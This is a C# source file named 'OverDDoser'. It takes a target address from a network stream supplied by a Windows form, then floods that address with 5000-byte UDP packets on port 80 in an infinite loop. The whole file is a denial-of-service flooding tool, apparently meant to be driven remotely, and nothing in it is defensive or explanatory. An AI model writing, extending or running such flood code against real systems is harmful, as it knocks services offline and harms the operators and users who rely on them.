using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Net;
using System.Net.Sockets;
using System.IO;
using System.Windows.Forms;

namespace OverDDoser
{
    class OverDDoser
    {
        public int a;
        public OverDDoser(string[] Args)
        {
            int a = 10;
            this.a = a;
            Form1 f = new Form1();
            f.ShowDialog();
            NetworkStream s = f.stream;
            StreamReader sr = new StreamReader(s);
            string Address = sr.ReadLine();
            using (UdpClient c = new UdpClient(80))
                while (true)
                    c.Send(new byte[5000], 5000, Address, 80);
        }
    }
}
